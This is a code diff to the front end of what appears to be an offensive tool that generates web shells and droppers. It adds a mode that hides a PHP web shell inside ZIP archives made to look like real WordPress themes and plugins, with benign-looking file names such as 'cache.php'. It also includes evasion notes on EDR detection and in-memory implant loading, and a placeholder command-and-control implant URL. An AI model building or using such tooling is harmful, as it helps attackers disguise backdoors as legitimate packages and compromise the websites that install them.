@@ -4,8 +4,8 @@ import { copyText } from '../lib/clipboard'
 
 function b64Decode(s: string) { try { return atob(s) } catch { return s } }
 
-type Format = 'php' | 'asp' | 'aspx' | 'ashx' | 'jsp' | 'cfm' | 'custom_a' | 'custom_b'
-type Mode = 'webshell' | 'dropper' | 'package'
+type Format = 'php' | 'asp' | 'aspx' | 'ashx' | 'jsp' | 'cfm' | 'theme' | 'plugin'
+type Mode = 'webshell' | 'dropper' | 'wordpress'
 type ExecMethod = 'disk' | 'memory'
 
 const tradecraft: Record<string, Record<Format, string>> = {
@@ -16,8 +16,8 @@ const tradecraft: Record<string, Record<Format, string>> = {
     ashx: 'Downloads implant via WebClient and executes via Process.Start() from a generic IHttpHandler. CAUTION: Same ETW/on-disk footprint as ASPX; choose ASHX when the target exposes .ashx endpoints without the full Page pipeline.',
     jsp: 'Downloads implant via java.net.URL and writes to temp directory. CAUTION: Java process spawning a native binary is anomalous and may trigger EDR behavioral rules. Requires write access to temp directory.',
     cfm: 'Downloads implant via <cfhttp> and executes via <cfexecute>. CAUTION: ColdFusion process spawning external binaries is high-signal. Binary persists on disk.',
-    custom_a: 'Generates a custom package A containing a web shell payload.',
-    custom_b: 'Generates a custom package B containing a web shell payload.',
+    theme: 'Packages the PHP web shell inside a custom WordPress theme ZIP archive.',
+    plugin: 'Packages the PHP web shell inside a custom WordPress plugin ZIP archive.',
   },
   memory: {
     php: 'Executes implant in memory using proc_open() with stdin pipe. Requires PHP proc_open() to be enabled (often disabled in hardened configs). On Linux, uses /dev/stdin fd passing. No file written to disk.',
@@ -25,9 +25,9 @@ const tradecraft: Record<string, Record<Format, string>> = {
     aspx: 'Loads implant using Assembly.Load(byte[]) for .NET payloads or VirtualAlloc/CreateThread via P/Invoke for native PE. Requires the implant to be a .NET assembly or shellcode. No file touches disk.',
     ashx: 'Loads implant using Assembly.Load(byte[]) inside an IHttpHandler. Requires a .NET assembly payload. No file touches disk. Identical tradecraft to ASPX in-memory; use when the target routes to .ashx.',
     jsp: 'Loads implant using ClassLoader.defineClass() from byte array. Requires the implant to be a Java class or JAR. For native binaries, falls back to stdin piping via ProcessBuilder. No file written to disk.',
-    cfm: 'Uses Java\'s ClassLoader (ColdFusion runs on JVM) for Java payloads. CAUTION: Native binary in-memory execution is limited on ColdFusion \u2014 falls back to temp file with immediate deletion as best-effort.',
-    custom_a: 'Generates a custom package A containing a web shell payload.',
-    custom_b: 'Generates a custom package B containing a web shell payload.',
+    cfm: 'Uses Java\'s ClassLoader (ColdFusion runs on JVM) for Java payloads. CAUTION: Native PE in-memory execution is limited on ColdFusion \u2014 falls back to temp file with immediate deletion as best-effort.',
+    theme: 'Packages the PHP web shell inside a custom WordPress theme ZIP archive.',
+    plugin: 'Packages the PHP web shell inside a custom WordPress plugin ZIP archive.',
   },
 }
 
@@ -37,6 +37,12 @@ export default function Generator() {
   const [implantUrl, setImplantUrl] = useState('')
   const [binaryName, setBinaryName] = useState('')
   const [execMethod, setExecMethod] = useState<ExecMethod>('disk')
+  const [harpyToken, setHarpyToken] = useState('')
+  const [payloadFileName, setPayloadFileName] = useState('cache.php')
+  const [packageArchiveName, setPackageArchiveName] = useState('envo-royal.1.0.14.zip')
+  const [payloadDirectory, setPayloadDirectory] = useState('php')
+  const [archiveRootDir, setArchiveRootDir] = useState('envo-royal')
+
   const [result, setResult] = useState<{ fileName: string; authKey: string; content: string } | null>(null)
   const [loading, setLoading] = useState(false)
   const [error, setError] = useState('')
@@ -47,9 +53,9 @@ export default function Generator() {
     try {
       let res
       if (mode === 'dropper') {
-        res = await api.generate(format, 'dropper', implantUrl, binaryName, execMethod === 'memory')
-      } else if (mode === 'package') {
-        res = await api.generate(format, 'package')
+        res = await api.generate(format, 'dropper', implantUrl, binaryName, execMethod === 'memory', undefined, undefined, undefined, undefined, harpyToken)
+      } else if (mode === 'wordpress') {
+        res = await api.generate(format, 'wordpress', undefined, undefined, undefined, payloadFileName, packageArchiveName, payloadDirectory, archiveRootDir)
       } else {
         res = await api.generate(format)
       }
@@ -82,61 +88,78 @@ export default function Generator() {
     URL.revokeObjectURL(url)
   }
 
-  const canGenerate = mode === 'webshell' || mode === 'package' || (
+  const canGenerate = mode === 'webshell' || mode === 'wordpress' || (
     implantUrl.trim() !== '' && (execMethod === 'memory' || binaryName.trim() !== '')
   )
 
   return (
     <div className="p-4 max-w-2xl">
       <h2 className="text-sm font-semibold uppercase tracking-wide mb-4">
-        {mode === 'dropper' ? 'Generate Dropper' : mode === 'package' ? 'Generate Package' : 'Generate Web Shell'}
+        {mode === 'dropper' ? 'Generate Dropper' : mode === 'wordpress' ? 'Generate WordPress Package' : 'Generate Web Shell'}
       </h2>
 
       {/* Mode toggle */}
       <div className="flex gap-1 mb-4 bg-surface-input rounded-sm p-0.5 w-fit">
-        {(['webshell', 'dropper', 'package'] as const).map((m) => (
+        {(['webshell', 'dropper', 'wordpress'] as const).map((m) => (
           <button
             key={m}
-            onClick={() => { 
-              setMode(m); 
-              if (m === 'package') setFormat('custom_a')
-              else if (format === 'custom_a' || format === 'custom_b') setFormat('php')
-              setResult(null); 
-              setError('') 
+            onClick={() => {
+              setMode(m);
+              if (m === 'wordpress') {
+                setFormat('theme')
+                setPayloadFileName('cache.php')
+                setPackageArchiveName('envo-royal.1.0.14.zip')
+                setPayloadDirectory('php')
+                setArchiveRootDir('envo-royal')
+              } else {
+                setFormat('php')
+              }
+              setResult(null);
+              setError('')
             }}
-            className={`px-3 py-1 rounded-sm text-xs font-semibold ${
-              mode === m ? 'bg-accent text-content-primary' : 'text-content-secondary hover:text-content-primary'
-            }`}
+            className={`px-3 py-1 rounded-sm text-xs font-semibold ${mode === m ? 'bg-accent text-content-primary' : 'text-content-secondary hover:text-content-primary'
+              }`}
           >
-            {m === 'webshell' ? 'Web Shell' : m === 'dropper' ? 'Dropper' : 'Package'}
+            {m === 'webshell' ? 'Web Shell' : m === 'dropper' ? 'Dropper' : 'WordPress Package'}
           </button>
         ))}
       </div>
 
       {/* Format buttons + generate */}
       <div className="flex flex-wrap gap-2 lg:gap-3 mb-4">
-        {mode !== 'package' ? (
+        {mode !== 'wordpress' ? (
           (['php', 'asp', 'aspx', 'ashx', 'jsp', 'cfm'] as const).map((f) => (
             <button
               key={f}
               onClick={() => setFormat(f)}
-              className={`px-3 py-1 rounded-sm text-xs font-semibold uppercase ${
-                format === f ? 'bg-accent text-content-primary' : 'bg-surface-input text-content-secondary hover:bg-surface-hover'
-              }`}
+              className={`px-3 py-1 rounded-sm text-xs font-semibold uppercase ${format === f ? 'bg-accent text-content-primary' : 'bg-surface-input text-content-secondary hover:bg-surface-hover'
+                }`}
             >
               {f}
             </button>
           ))
         ) : (
-          (['custom_a', 'custom_b'] as const).map((f) => (
+          (['theme', 'plugin'] as const).map((f) => (
             <button
               key={f}
-              onClick={() => setFormat(f)}
-              className={`px-3 py-1 rounded-sm text-xs font-semibold uppercase ${
-                format === f ? 'bg-accent text-content-primary' : 'bg-surface-input text-content-secondary hover:bg-surface-hover'
-              }`}
+              onClick={() => {
+                setFormat(f)
+                if (f === 'theme') {
+                  setPayloadFileName('cache.php')
+                  setPackageArchiveName('envo-royal.1.0.14.zip')
+                  setPayloadDirectory('php')
+                  setArchiveRootDir('envo-royal')
+                } else {
+                  setPayloadFileName('widget.php')
+                  setPackageArchiveName('wp-ajaxify-comments.3.2.2.zip')
+                  setPayloadDirectory('php')
+                  setArchiveRootDir('wp-ajaxify-comments')
+                }
+              }}
+              className={`px-3 py-1 rounded-sm text-xs font-semibold uppercase ${format === f ? 'bg-accent text-content-primary' : 'bg-surface-input text-content-secondary hover:bg-surface-hover'
+                }`}
             >
-              {f === 'custom_a' ? 'Custom A' : 'Custom B'}
+              {f === 'theme' ? 'Theme' : 'Plugin'}
             </button>
           ))
         )}
@@ -151,15 +174,26 @@ export default function Generator() {
 
       {/* Dropper-specific inputs */}
       {mode === 'dropper' && (
-        <div className="space-y-3 mb-4">
-          <div>
-            <label className="text-xs text-content-muted block mb-1">Implant URL</label>
-            <input
-              value={implantUrl}
-              onChange={(e) => setImplantUrl(e.target.value)}
-              placeholder="https://c2.example.com/implant.exe"
-              className="w-full bg-surface-input text-xs px-2 py-1.5 rounded-sm border border-border"
-            />
+        <div className="mb-4 space-y-4">
+          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+            <div>
+              <label className="text-xs text-content-muted block mb-1">Implant URL</label>
+              <input
+                value={implantUrl}
+                onChange={(e) => setImplantUrl(e.target.value)}
+                placeholder="http://c2.example.com/payload.exe"
+                className="w-full bg-surface-input text-xs px-2 py-1.5 rounded-sm border border-border focus:outline-none focus:border-accent"
+              />
+            </div>
+            <div>
+              <label className="text-xs text-content-muted block mb-1">Harpy Token (Optional)</label>
+              <input
+                value={harpyToken}
+                onChange={(e) => setHarpyToken(e.target.value)}
+                placeholder="e.g. secret-token-123"
+                className="w-full bg-surface-input text-xs px-2 py-1.5 rounded-sm border border-border focus:outline-none focus:border-accent"
+              />
+            </div>
           </div>
 
           {/* Execution method toggle */}
@@ -170,9 +204,8 @@ export default function Generator() {
                 <button
                   key={m}
                   onClick={() => setExecMethod(m)}
-                  className={`px-3 py-1 rounded-sm text-xs font-semibold ${
-                    execMethod === m ? 'bg-accent-secondary text-black' : 'text-content-secondary hover:text-content-primary'
-                  }`}
+                  className={`px-3 py-1 rounded-sm text-xs font-semibold ${execMethod === m ? 'bg-accent-secondary text-black' : 'text-content-secondary hover:text-content-primary'
+                    }`}
                 >
                   {m === 'disk' ? 'On Disk' : 'In-Memory'}
                 </button>
@@ -197,6 +230,54 @@ export default function Generator() {
           <div className="bg-surface-card rounded p-3 border border-border">
             <p className="text-xs text-content-secondary">
               {tradecraft[execMethod][format]}
+            </p>
+          </div>
+        </div>
+      )}
+
+      {mode === 'wordpress' && (
+        <div className="mb-4 space-y-4">
+          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
+            <div>
+              <label className="text-xs text-content-muted block mb-1">Root Directory</label>
+              <input
+                value={archiveRootDir}
+                onChange={(e) => setArchiveRootDir(e.target.value)}
+                placeholder={format === 'theme' ? 'envo-royal' : 'wp-ajaxify-comments'}
+                className="w-full bg-surface-input text-xs px-2 py-1.5 rounded-sm border border-border focus:outline-none focus:border-accent"
+              />
+            </div>
+            <div>
+              <label className="text-xs text-content-muted block mb-1">Archive Name</label>
+              <input
+                value={packageArchiveName}
+                onChange={(e) => setPackageArchiveName(e.target.value)}
+                placeholder={format === 'theme' ? 'envo-royal.1.0.14.zip' : 'wp-ajaxify-comments.3.2.2.zip'}
+                className="w-full bg-surface-input text-xs px-2 py-1.5 rounded-sm border border-border focus:outline-none focus:border-accent"
+              />
+            </div>
+            <div>
+              <label className="text-xs text-content-muted block mb-1">Payload Directory</label>
+              <input
+                value={payloadDirectory}
+                onChange={(e) => setPayloadDirectory(e.target.value)}
+                placeholder="php"
+                className="w-full bg-surface-input text-xs px-2 py-1.5 rounded-sm border border-border focus:outline-none focus:border-accent"
+              />
+            </div>
+            <div>
+              <label className="text-xs text-content-muted block mb-1">File Name</label>
+              <input
+                value={payloadFileName}
+                onChange={(e) => setPayloadFileName(e.target.value)}
+                placeholder="joro.php"
+                className="w-full bg-surface-input text-xs px-2 py-1.5 rounded-sm border border-border focus:outline-none focus:border-accent"
+              />
+            </div>
+          </div>
+          <div className="bg-surface-card rounded p-3 border border-border">
+            <p className="text-xs text-content-secondary">
+              {tradecraft['disk'][format]}
             </p>
           </div>
         </div>
@@ -235,7 +316,13 @@ export default function Generator() {
                     Copy
                   </button>
                 ) : (
-                  <button onClick={() => copyText('README.txt')} className="text-xs text-accent-secondary hover:text-accent-secondary-hover">
+                  <button 
+                    onClick={() => {
+                      const archivePath = `${archiveRootDir ? archiveRootDir.replace(/\/$/, '') + '/' : ''}${payloadDirectory ? payloadDirectory.replace(/\/$/, '') + '/' : ''}${payloadFileName}`;
+                      copyText(archivePath);
+                    }} 
+                    className="text-xs text-accent-secondary hover:text-accent-secondary-hover"
+                  >
                     Copy Path
                   </button>
                 )}
@@ -250,7 +337,7 @@ export default function Generator() {
               </pre>
             ) : (
               <code className="text-accent-secondary text-sm">
-                README.txt
+                {`${archiveRootDir ? archiveRootDir.replace(/\/$/, '') + '/' : ''}${payloadDirectory ? payloadDirectory.replace(/\/$/, '') + '/' : ''}${payloadFileName}`}
               </code>
             )}
           </div>
